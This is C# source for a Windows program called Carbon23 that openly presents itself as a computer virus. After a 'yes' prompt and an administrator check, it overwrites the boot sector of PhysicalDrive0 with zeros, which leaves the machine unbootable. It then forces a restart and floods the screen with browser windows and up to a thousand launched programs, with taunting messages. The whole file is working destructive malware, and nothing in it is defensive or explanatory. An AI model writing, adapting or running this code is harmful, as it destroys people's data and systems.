namespace Carbon23
{
    
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;
    using System.IO;
    using static utils;

    internal class Program
    {
        
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);
        
        [DllImport("kernel32")]
        static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped
        );
        
        
        //dwDesiredAccess
        const uint GenericRead = 0x80000000;
        const uint GenericWrite = 0x40000000;
        const uint GenericExecute = 0x20000000;
        const uint GenericAll = 0x10000000;
        
        //dwShareMode
        const uint FileShareRead = 0x1;
        const uint FileShareWrite = 0x2;
        
        //dwCreationDisposition
        const uint OpenExisting = 0x3;
        const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;
        
        public static void Main(string[] args)
        {
            Console.WriteLine("DO YOU REALLY WANT TO RUN THIS MALWARE?? THIS IS AN ACTUAL COMPUTER VIRUS. THIS IS NOT A JOKE!");
            Console.WriteLine("TYPE yes AT YOUR OWN RISK!");
            String DoTheyAcceptRisk = Console.ReadLine();
            if (DoTheyAcceptRisk.ToLower().Replace(" ", "") == "yes")
            {
                if (new utils().isAdminstrator())
                {
                    var MBRDATA = new byte[MbrSize];
                            
                    var MBR = CreateFile(
                        "\\\\.\\PhysicalDrive0",
                        GenericAll,
                        FileShareRead | FileShareWrite,
                        IntPtr.Zero,
                        OpenExisting,
                        0,
                        IntPtr.Zero
                    );
                    
                    var result = WriteFile(MBR, MBRDATA, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
                            
                    if (result)
                    {
                        Process.Start(new ProcessStartInfo{FileName = "cmd.exe", Arguments = "/C shutdown -r -t 120", UseShellExecute = true} );
                        Console.WriteLine("Enjoy your last 2 minutes using your computer :)");
                        Console.WriteLine("Your PC will die. You just ran a virus!");
                        Console.WriteLine("");
                        Console.WriteLine("Canceling shutdown won't help :) Your PC will die after a restart anyways.");
                        for (int i = 0; i < 20; i++)
                        {
                            Process.Start(new ProcessStartInfo{FileName = "explorer.exe", Arguments = "\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"", UseShellExecute = true} );
                        }
                        String[] programs = { "notepad.exe", "cmd.exe", "control.exe" };
                        for (int i = 0; i < 1000; i++)
                        {
                            try
                            {
                                Process.Start(new ProcessStartInfo{FileName = programs[new Random().Next(0, programs.Length)], UseShellExecute = true} );
                            }
                            catch (IOException e)
                            {
                                Console.WriteLine(e);
                            }
                        }
                        Console.ReadLine();
                    }
                    else
                    {
                        Console.WriteLine("More like Your PC SAVED YOU IDIOT!");
                    }
                }
                else
                {
                    MessageBox.Show("[!] You need to run this program as administrator.", "Administrator permission required");
                    Console.WriteLine("[!] Administrator permission required.");
                }
            }
            else
            {
                Console.WriteLine("Canceled running computer virus.");
            }
            
            
        }
    }
}